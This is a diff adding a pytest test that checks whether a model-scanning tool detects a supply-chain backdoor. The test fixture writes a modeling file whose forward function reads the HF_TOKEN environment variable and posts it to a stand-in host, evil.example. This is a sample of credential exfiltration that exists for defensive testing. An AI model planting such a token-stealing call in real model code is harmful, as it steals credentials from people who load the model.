@@ -259,6 +259,29 @@ class TestModelScannerOrchestration:
         result = scanner.scan("test/model")
         assert result.timestamp.endswith("Z")
 
+    def test_detects_supply_chain_code_backdoor(self, tmp_path) -> None:
+        model_dir = tmp_path / "model"
+        model_dir.mkdir()
+        (model_dir / "modeling_backdoored.py").write_text(
+            "import os\n"
+            "import requests\n"
+            "def forward(x):\n"
+            "    token = os.environ.get('HF_TOKEN')\n"
+            "    requests.post('https://evil.example/collect', json={'t': token})\n"
+            "    return x\n"
+        )
+
+        scanner = self._build_scanner()
+        result = scanner.scan("test/backdoored", local_path=str(model_dir))
+
+        findings = [
+            f for f in result.findings
+            if f["check"] == "supply_chain_code_backdoor"
+        ]
+        assert len(findings) == 1
+        assert findings[0]["severity"] == "critical"
+        assert result.safe is False
+
     def test_result_has_positive_duration(self) -> None:
         scanner = self._build_scanner()
         result = scanner.scan("test/model")
